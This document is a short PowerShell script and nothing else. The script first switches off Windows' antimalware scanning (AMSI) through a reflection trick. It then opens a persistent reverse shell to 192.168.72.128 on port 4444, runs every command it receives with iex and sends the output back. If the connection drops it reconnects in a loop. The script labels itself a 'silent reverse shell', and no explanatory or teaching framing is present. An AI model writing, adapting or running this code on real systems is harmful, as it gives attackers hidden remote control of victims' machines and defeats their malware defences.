$ip = "192.168.72.128"
$port = 4444

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true

        $writer.WriteLine("[+] Silent reverse shell connected - $(Get-Date)")
        $writer.Write("PS $($pwd.Path)> ")

        while ($true) {
            $command = $reader.ReadLine()
            if ($command) {
                try {
                    $result = iex $command 2>&1 | Out-String
                    $writer.Write($result)
                } catch {
                    $writer.WriteLine("ERROR: $($_.Exception.Message)")
                }
            }
            $writer.Write("PS $($pwd.Path)> ")
        }
    } catch {
        Start-Sleep -Seconds 8
    }
}
